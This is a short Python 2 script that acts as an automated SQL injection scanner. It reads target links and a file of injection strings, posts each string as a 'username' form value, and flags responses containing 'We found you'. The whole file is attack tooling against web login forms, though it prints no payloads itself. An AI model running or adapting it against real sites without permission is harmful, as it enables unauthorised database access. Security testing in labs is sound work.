import requests
import json
from utility import read_result, get_success_message,SI
from generator import generator, render

print '\n'
print 'start sql injection'


result = read_result()
links = result['link']
commons = 'sql_injection_commons.txt'
f = open(commons, 'r')
injections = f.read().splitlines()

SI_geneartor = generator(SI)

for link in links:
    for injection in injections:
        payload = {
            'username': injection
        }
        req = requests.post(link, data=payload)
        if req.content.find('We found you') != -1:
            print get_success_message(link + ' ' + json.dumps(payload))

print 'finish sql injection'
